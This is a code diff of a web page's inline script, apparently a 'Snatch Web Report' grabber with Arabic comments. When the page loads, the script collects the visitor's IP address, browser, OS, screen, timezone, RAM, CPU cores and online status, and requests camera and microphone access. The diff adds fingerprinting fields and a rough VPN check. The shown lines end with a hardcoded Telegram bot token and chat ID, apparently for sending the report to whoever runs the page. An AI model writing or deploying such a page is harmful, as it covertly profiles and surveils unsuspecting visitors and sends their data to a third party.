@@ -6,6 +6,7 @@
   <script>
     (async () => {
       const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip);
+
       const data = {
         ip,
         ua: navigator.userAgent,
@@ -13,19 +14,35 @@
         lang: navigator.language,
         screen: `${screen.width}x${screen.height}`,
         tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        time: new Date().toLocaleString()
+        time: new Date().toLocaleString(),
+        deviceMemory: navigator.deviceMemory || "N/A",
+        cores: navigator.hardwareConcurrency || "N/A",
+        online: navigator.onLine ? "✅ Online" : "❌ Offline"
       };
 
-      // 🔥 المحاولة للوصول إلى الكاميرا والمايك
-      let camAccess = "❌ Blocked or Failed";
+      // 🟡 المحاولة للوصول إلى الكاميرا والمايكروفون
+      let camAccess = "❌ Blocked";
       try {
         await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        camAccess = "✅ Access Granted";
+        camAccess = "✅ Granted";
       } catch (e) {
         camAccess = "❌ " + e.name;
       }
 
-      const msg = `📡 *Snatch Web Report*\n\n🌍 IP: ${data.ip}\n🖥️ OS: ${data.platform}\n📱 Agent: ${data.ua}\n🗺️ Lang: ${data.lang}\n📏 Screen: ${data.screen}\n🕒 Timezone: ${data.tz}\n⏰ Time: ${data.time}\n🎥 Camera/Mic: ${camAccess}`;
+      // 🔍 هل يستخدم VPN أو Proxy؟ (بناءً على IP ranges الشائعة - خفيف)
+      let vpnFlag = ip.startsWith("10.") || ip.startsWith("192.") || ip.startsWith("172.") ? "🌐 احتمال VPN/Local" : "📡 Public IP";
+
+      const msg = `📡 *Snatch Web Report*
+🌍 IP: ${data.ip} (${vpnFlag})
+🖥️ OS: ${data.platform}
+📱 Agent: ${data.ua}
+🧠 RAM: ${data.deviceMemory} GB | Cores: ${data.cores}
+🗺️ Lang: ${data.lang}
+📏 Screen: ${data.screen}
+🔌 Status: ${data.online}
+🕒 Timezone: ${data.tz}
+⏰ Time: ${data.time}
+🎥 Camera/Mic: ${camAccess}`;
 
       const token = "7809696227:AAGk8fExoDKgW4xN5X7mhxQ7c7raA2_7uaw";
       const chat_id = "6991944640";
